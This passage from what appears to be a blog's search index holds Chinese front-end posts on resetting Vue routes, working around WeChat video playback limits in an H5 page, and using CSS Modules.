class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Router <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(Router)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> createRouter = <span class="function">() =&gt;</span> <span class="keyword">new</span> Router(&#123;</span><br><span class="line">  mode: <span class="string">&#x27;history&#x27;</span>,</span><br><span class="line">  routes: []</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = createRouter()</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">resetRouter</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> newRouter = createRouter()</span><br><span class="line">  router.matcher = newRouter.matcher</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><p>通过新建一个全新的 Router，然后将新的 Router.matcher 赋给当前页面的管理 Router，以达到更新路由配置的目的。</p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
            <tag> javaScript </tag>
            
            <tag> 权限管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信视频H5开发小结</title>
      <link href="2017/12/11/%E5%BE%AE%E4%BF%A1%E8%A7%86%E9%A2%91H5%E5%BC%80%E5%8F%91%E5%B0%8F%E7%BB%93/"/>
      <url>2017/12/11/%E5%BE%AE%E4%BF%A1%E8%A7%86%E9%A2%91H5%E5%BC%80%E5%8F%91%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>近日，由于工作原因，需要开发一款视频类 h5。玩法很简单，用户滚页面至底部，切换全屏视频播放。</p><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><h5 id="全屏同层播放"><a href="#全屏同层播放" class="headerlink" title="全屏同层播放"></a>全屏同层播放</h5><p>为了满足交互需求，需要达到全屏同层播放，具体配置如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;video</span><br><span class="line">    id=<span class="string">&quot;my-video&quot;</span> </span><br><span class="line">    type=<span class="string">&quot;video/mp4&quot;</span> x5-video-player-fullscreen=<span class="string">&quot;false&quot;</span></span><br><span class="line">    webkit-playsinline</span><br><span class="line">    playsinline</span><br><span class="line">    x-webkit-airplay=<span class="string">&quot;allow&quot;</span> x5-video-player-type=<span class="string">&quot;h5&quot;</span></span><br><span class="line">    src=<span class="string">&quot;www.baidu.com&quot;</span>&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure><h5 id="视频预加载"><a href="#视频预加载" class="headerlink" title="视频预加载"></a>视频预加载</h5><p>由于该 H5 为视频类 H5 ，在移动端播放视频还是要考虑到加载速度及稳定播放等问题，因此笔者采用的是 “边播边加载” 的方式，利用 video 标签的 canplaythrough 事件作为页面加载完成的标志。</p><p>由于移动端原因， video 并不会主动去预加载用户未需求的资源，因此我们需要手动去触发 video 的预加载资源，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;my-video&#x27;</span>).play();</span><br></pre></td></tr></table></figure><p>这样就可以了吗？</p><p>不，万恶的微信限制了必须用户行为才能播放媒体资源，因此我们只能再祭出万能 hack：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> video = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;my-video&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">preload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        video.play();</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            video.pause();</span><br><span class="line">        &#125;, <span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">&quot;WeixinJSBridgeReady&quot;</span>,  preload, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> WeixinJSBridge == <span class="string">&quot;object&quot;</span> &amp;&amp; <span class="keyword">typeof</span> WeixinJSBridge.invoke == <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">        WeixinJSBridge.invoke(<span class="string">&quot;getNetworkType&quot;</span>, &#123;&#125;, preload);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    preload(); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="槽点"><a href="#槽点" class="headerlink" title="槽点"></a>槽点</h3><h5 id="布局限制"><a href="#布局限制" class="headerlink" title="布局限制"></a>布局限制</h5><p>安卓端由于无法像 ios 端完美的实现全屏播放，播放视频时手机依旧会进入媒体播放模式，这就导致了播放视频时会连带着媒体播放层的弹出，而媒体播放层则类似于 position: fixed; top: 0; left: 0; 的效果固定在页面顶部，每个媒体<br>播放层的弹出，都会预先将页面滚动至顶部，如果页面发生滚动，在安卓端播放视频就会出现短暂的黑屏。</p><p><strong>因此，微信视频类 H5 如果需要滚动存在，请采用局部滚动。</strong></p><h5 id="用户行为限制"><a href="#用户行为限制" class="headerlink" title="用户行为限制"></a>用户行为限制</h5><p>安卓端下，滚动行为不归属在用户操作行为中，滚动事件中无法执行视频播放，在这个问题上，笔者使用 touchstart 对安卓端进行 hack。</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul><li><a href="https://www.cnblogs.com/baiyygynui/p/6323565.html">video 标签在微信浏览器的问题解决方法</a></li><li><a href="https://www.zhihu.com/question/36423771">微信内置浏览器 如何小窗不全屏播放视频？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weChat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Css Modules 小试</title>
      <link href="2017/11/11/Css%20Modules%20%E5%B0%8F%E8%AF%95/"/>
      <url>2017/11/11/Css%20Modules%20%E5%B0%8F%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>一个css模块即一个定义好了所有样式（类）和动画名称的本地css文件</p><blockquote><p>官方推荐仅使用类来定义样式</p></blockquote><p>CSS Modules 会编译成一种低层级的ICSS，但它的格式与正常css格式相似</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* style.css */</span></span><br><span class="line">.className &#123;</span><br><span class="line">    color: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当使用js模块导入css模块时，它输出一个属性与本地样式名称相对应的对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">&#x27;./style.css&#x27;</span>;</span><br><span class="line"></span><br><span class="line">element.innerHTML = <span class="string">&#x27;&lt;div class=&quot;&#x27;</span> + styles.className + <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h3><p>对于本地类名建议使用驼峰命名，但并非强制</p><blockquote><p>关于使用驼峰命名的方式主要是为了更好在js中导入并使用css模块</p></blockquote><p>可以为css-loader增加camelCase参数来实现自动转换</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">    loader: <span class="string">&#x27;style!css?modules&amp;camelCase&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>:global: 切换到当前选择器所在全局作用域下<br>:local: 切换到局部作用域下</p><p>如果切换到全局模式下，定义的样式将允许在全局作用域中使用</p><p>Example:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localA :<span class="built_in">global</span> .global-b .global-c :local(.localD.localE) .global-d</span><br></pre></td></tr></table></figure><h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><p>用于组合其它选择器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.className &#123;</span><br><span class="line">    color: green;</span><br><span class="line">    background: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.otherClassName &#123;</span><br><span class="line">    composes: className;</span><br><span class="line">    color: yellow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>允许拥有多个组成规则，但组成规则必须先于其它规则。当一个类composes另外一个类时，css模块对外的接口为当前类名，允许添加多个类名。</p><p>组成规则允许使用多个类：composes: classNameA classNameB</p><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p>允许compose其它CSS Modules的类名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.otherClassName &#123;</span><br><span class="line">    composes: className <span class="keyword">from</span> <span class="string">&#x27;./style.css&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><ol><li>当从不同的文件composes多个类时，compose的顺序是不确定的，因此，需要确保composes的类没有定义相同的属性值</li><li>compose不应该循环嵌套，因为Elsewise是无法确定这是组成规则还是属性，模块系统将会发出一个错误。</li><li>最好的方式就是基本类与依赖分离</li></ol><h3 id="为什么使用CSS-Modules"><a href="#为什么使用CSS-Modules" class="headerlink" title="为什么使用CSS Modules"></a>为什么使用CSS Modules</h3><p>模块化和可重复使用的css</p><ul><li>解决命名冲突</li><li>显式依赖</li><li>没有全局作用域</li></ul><h3 id="编译结果"><a href="#编译结果" class="headerlink" title="编译结果"></a>编译结果</h3><ul><li>默认为哈希字符串</li><li>允许自定义配置</li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
            <tag> Css Modules </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
